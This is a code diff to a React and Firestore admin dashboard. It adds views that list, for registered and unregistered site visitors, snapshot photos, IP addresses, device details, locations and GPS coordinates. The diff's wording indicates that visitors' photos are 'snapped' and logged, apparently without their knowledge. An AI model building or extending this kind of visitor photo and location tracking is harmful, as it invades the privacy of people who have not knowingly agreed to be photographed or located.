@@ -44,6 +44,9 @@ export default function App() {
   const [loadingUserSearches, setLoadingUserSearches] = useState(false);
   const [selectedReportText, setSelectedReportText] = useState(null);
 
+  const [unregisteredVisits, setUnregisteredVisits] = useState([]);
+  const [userVisits, setUserVisits] = useState([]);
+
   useEffect(() => {
     const fetchMetrics = async () => {
       try {
@@ -76,6 +79,19 @@ export default function App() {
             (a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0),
           ),
         );
+
+        const unregSnapshot = await getDocs(
+          collection(db, "unregistered_visits")
+        );
+        const unreg = [];
+        unregSnapshot.forEach((doc) => {
+          unreg.push({ id: doc.id, ...doc.data() });
+        });
+        setUnregisteredVisits(
+          unreg.sort(
+            (a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0),
+          ),
+        );
       } catch (err) {
         console.error("Failed to load metrics:", err);
         setErrorMsg("Failed to load metrics. See console for details.");
@@ -90,6 +106,7 @@ export default function App() {
     setLoadingUserSearches(true);
     setErrorMsg(null);
     setUserSearches([]);
+    setUserVisits([]);
 
     try {
       const searchesSnapshot = await getDocs(
@@ -103,9 +120,21 @@ export default function App() {
       setUserSearches(
         s.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0))
       );
+
+      const visitsSnapshot = await getDocs(
+        collection(db, "registered_users", user.id, "visit_history")
+      );
+      const v = [];
+      visitsSnapshot.forEach((docSnap) => {
+        v.push({ id: docSnap.id, ...docSnap.data() });
+      });
+
+      setUserVisits(
+        v.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0))
+      );
     } catch (err) {
-      console.error("Failed to load user searches:", err);
-      setErrorMsg("Failed to load user searches history. See console for details.");
+      console.error("Failed to load user logs:", err);
+      setErrorMsg("Failed to load user searches and visits history. See console for details.");
     } finally {
       setLoadingUserSearches(false);
     }
@@ -755,6 +784,58 @@ export default function App() {
                     )}
                   </div>
                 </div>
+
+                {/* Column 3: Clicked Photos History */}
+                <div className="history-column">
+                  <h3>Clicked Photos History ({userVisits.length})</h3>
+                  <div className="history-list-wrap">
+                    {userVisits.length === 0 ? (
+                      <p className="empty-text">No login or visit photos captured yet.</p>
+                    ) : (
+                      <div className="activity-list">
+                        {userVisits.map((visit) => {
+                          const visitTime = visit.timestamp?.toDate();
+                          return (
+                            <div className="activity-log-item" key={visit.id} style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
+                              <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
+                                {visit.photo && visit.photo.startsWith("data:image") ? (
+                                  <img
+                                    src={visit.photo}
+                                    alt="Visit Snapshot"
+                                    style={{
+                                      width: "48px",
+                                      height: "48px",
+                                      borderRadius: "6px",
+                                      objectFit: "cover",
+                                      border: "1px solid var(--accent)",
+                                      cursor: "pointer"
+                                    }}
+                                    onClick={() => setSelectedReportText(visit.photo)}
+                                  />
+                                ) : (
+                                  <span style={{ fontSize: "0.8rem", color: "var(--text-secondary)" }}>No Photo</span>
+                                )}
+                                <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
+                                  <span style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
+                                    {visitTime ? visitTime.toLocaleString() : "--"}
+                                  </span>
+                                  <span style={{ fontSize: "0.8rem", color: "white" }}>
+                                    {visit.location || "Unknown Location"}
+                                  </span>
+                                </div>
+                              </div>
+                              {visit.coordinates && (
+                                <div style={{ fontSize: "0.75rem", color: "var(--accent)", fontFamily: "monospace" }}>
+                                  Coords: {visit.coordinates}
+                                </div>
+                              )}
+                            </div>
+                          );
+                        })}
+                      </div>
+                    )}
+                  </div>
+                </div>
               </div>
             )}
           </div>
@@ -762,6 +843,106 @@ export default function App() {
       </>
     );
   };
+
+  const renderUnregisteredUsers = () => (
+    <>
+      <div className="page-header">
+        <h1>Unregistered User Visits</h1>
+        <p>Location, coordinates, and photo logs snapped from unregistered/unsigned visitors.</p>
+      </div>
+
+      <div className="table-container glass">
+        <table>
+          <thead>
+            <tr>
+              <th>Photo</th>
+              <th>IP Address</th>
+              <th>Device</th>
+              <th>OS & Browser</th>
+              <th>Location</th>
+              <th>Coordinates</th>
+              <th>Visited At</th>
+            </tr>
+          </thead>
+          <tbody>
+            {unregisteredVisits.length === 0 && (
+              <tr>
+                <td
+                  colSpan="7"
+                  style={{
+                    textAlign: "center",
+                    color: "var(--text-secondary)",
+                    padding: "32px",
+                  }}
+                >
+                  No unregistered user visits logged yet.
+                </td>
+              </tr>
+            )}
+            {unregisteredVisits.map((visit) => {
+              const dateVal = visit.timestamp?.toDate();
+
+              return (
+                <tr className="table-row" key={visit.id}>
+                  <td>
+                    {visit.photo && visit.photo.startsWith("data:image") ? (
+                      <img
+                        src={visit.photo}
+                        alt="avatar"
+                        style={{
+                          width: "36px",
+                          height: "36px",
+                          borderRadius: "50%",
+                          objectFit: "cover",
+                          border: "1px solid var(--accent)",
+                          cursor: "pointer"
+                        }}
+                        onClick={() => setSelectedReportText(visit.photo)}
+                      />
+                    ) : (
+                      <span style={{ fontSize: "0.8rem", color: "var(--text-secondary)" }}>
+                        {visit.photo || "--"}
+                      </span>
+                    )}
+                  </td>
+                  <td style={{ color: "var(--accent)", fontWeight: "500", fontFamily: "monospace" }}>
+                    {visit.ipAddress || "--"}
+                  </td>
+                  <td>
+                    <span className="chip">
+                      {visit.device?.type === "mobile" ? (
+                        <Smartphone size={14} style={{ marginRight: 4 }} />
+                      ) : (
+                        <Monitor size={14} style={{ marginRight: 4 }} />
+                      )}
+                      {visit.device?.vendor || "Generic"} {visit.device?.model || "Device"}
+                    </span>
+                  </td>
+                  <td>
+                    <div style={{ fontSize: "0.85rem", color: "white", marginBottom: 2 }}>
+                      {visit.device?.os || "Unknown"}
+                    </div>
+                    <div style={{ fontSize: "0.8rem", color: "var(--text-secondary)" }}>
+                      {visit.device?.browser || "Browser"}
+                    </div>
+                  </td>
+                  <td>{visit.location || "--"}</td>
+                  <td>{visit.coordinates || "--"}</td>
+                  <td>
+                    {dateVal
+                      ? dateVal.toLocaleDateString() +
+                        " " +
+                        dateVal.toLocaleTimeString()
+                      : "--"}
+                  </td>
+                </tr>
+              );
+            })}
+          </tbody>
+        </table>
+      </div>
+    </>
+  );
 
   return (
     <div className="app-container">
@@ -794,6 +975,17 @@ export default function App() {
             Registered Users
           </button>
           <button
+            className={`nav-item ${activeTab === "unregistered" ? "active" : ""}`}
+            onClick={() => {
+              setSelectedFolder(null);
+              setSelectedUser(null);
+              setActiveTab("unregistered");
+            }}
+          >
+            <Smartphone size={18} />
+            Unregistered Users
+          </button>
+          <button
             className={`nav-item ${selectedFolder ? "active" : ""}`}
             disabled={!selectedFolder}
             style={{
@@ -810,11 +1002,13 @@ export default function App() {
       <main className="main-content">
         {selectedUser
           ? renderUserDetails()
-          : activeTab === "users"
-            ? renderRegisteredUsers()
-            : !selectedFolder
-              ? renderOverview()
-              : renderFolderDetails()}
+          : activeTab === "unregistered"
+            ? renderUnregisteredUsers()
+            : activeTab === "users"
+              ? renderRegisteredUsers()
+              : !selectedFolder
+                ? renderOverview()
+                : renderFolderDetails()}
       </main>
 
       {selectedReportText ? (
@@ -824,10 +1018,18 @@ export default function App() {
               &times;
             </button>
             <h3 style={{ marginBottom: "1rem", color: "var(--accent)", fontSize: "1.3rem" }}>
-              Generated AI Report
+              {selectedReportText.startsWith("data:image") ? "Snapped Photo Details" : "Generated AI Report"}
             </h3>
-            <div className="admin-report-text-scroll">
-              <pre className="admin-report-text">{selectedReportText}</pre>
+            <div className="admin-report-text-scroll" style={{ textAlign: "center" }}>
+              {selectedReportText.startsWith("data:image") ? (
+                <img
+                  src={selectedReportText}
+                  alt="Captured snapshot"
+                  style={{ maxWidth: "100%", maxHeight: "65vh", borderRadius: "8px", border: "1px solid var(--accent)", boxShadow: "0 8px 24px rgba(0,0,0,0.5)" }}
+                />
+              ) : (
+                <pre className="admin-report-text">{selectedReportText}</pre>
+              )}
             </div>
           </div>
         </div>
